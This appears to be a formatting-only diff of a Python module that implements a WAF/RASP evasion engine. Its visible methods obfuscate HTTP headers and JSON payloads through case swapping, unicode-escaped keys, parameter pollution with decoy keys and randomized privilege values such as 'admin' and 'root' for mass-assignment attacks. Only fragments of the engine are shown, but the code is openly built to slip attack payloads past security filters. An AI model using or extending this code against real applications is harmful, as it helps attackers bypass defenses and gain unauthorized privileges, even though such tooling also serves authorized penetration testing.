@@ -10,6 +10,7 @@ Polymorphic payload transformation engine to bypass WAF/RASP signatures:
 - Chunked body encoding simulation
 - Payload polymorphism (randomized MA values per execution)
 """
+
 import secrets
 import copy
 from typing import Dict, Any, Optional, List
@@ -28,7 +29,14 @@ class WAFEvasionEngine:
                 Options: unicode, case_swap, null_byte, hpp, polymorphic, whitespace
         """
         self.rng = secrets.SystemRandom()
-        all_techniques = ["unicode", "case_swap", "null_byte", "hpp", "polymorphic", "whitespace"]
+        all_techniques = [
+            "unicode",
+            "case_swap",
+            "null_byte",
+            "hpp",
+            "polymorphic",
+            "whitespace",
+        ]
         self.techniques = techniques or all_techniques
 
     # --- Path Obfuscation ---
@@ -88,15 +96,16 @@ class WAFEvasionEngine:
             else:
                 # Randomly swap case: X-Api-Key → x-API-kEY
                 new_key = "".join(
-                    c.upper() if self.rng.random() > 0.5 else c.lower()
-                    for c in key
+                    c.upper() if self.rng.random() > 0.5 else c.lower() for c in key
                 )
                 new_headers[new_key] = value
         return new_headers
 
     # --- Payload Obfuscation ---
 
-    def obfuscate_payload(self, payload: Optional[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
+    def obfuscate_payload(
+        self, payload: Optional[Dict[str, Any]]
+    ) -> Optional[Dict[str, Any]]:
         """Apply payload-level evasion techniques."""
         if not payload:
             return payload
@@ -129,7 +138,7 @@ class WAFEvasionEngine:
                     char = key[idx]
                     if char.isalpha():
                         escaped = f"\\u{ord(char):04x}"
-                        key = key[:idx] + escaped + key[idx + 1:]
+                        key = key[:idx] + escaped + key[idx + 1 :]
                 new_obj[key] = self._unicode_json_keys(value)
             return new_obj
         elif isinstance(obj, list):
@@ -151,7 +160,14 @@ class WAFEvasionEngine:
 
     def _polymorphic_values(self, obj: Any) -> Any:
         """Randomize Mass Assignment payload values to avoid static signatures."""
-        polymorphic_roles = ["admin", "Administrator", "ADMIN", "root", "superuser", "system"]
+        polymorphic_roles = [
+            "admin",
+            "Administrator",
+            "ADMIN",
+            "root",
+            "superuser",
+            "system",
+        ]
         if isinstance(obj, dict):
             new_obj = {}
             for key, value in obj.items():
@@ -182,7 +198,11 @@ class WAFEvasionEngine:
                     # Add a decoy with a benign value
                     decoy_key = key + "_"  # JSON doesn't support duplicate keys
                     new_obj[decoy_key] = "user" if isinstance(value, str) else False
-                new_obj[key] = value if not isinstance(value, (dict, list)) else self._http_parameter_pollution(value)
+                new_obj[key] = (
+                    value
+                    if not isinstance(value, (dict, list))
+                    else self._http_parameter_pollution(value)
+                )
             return new_obj
         elif isinstance(obj, list):
             return [self._http_parameter_pollution(item) for item in obj]
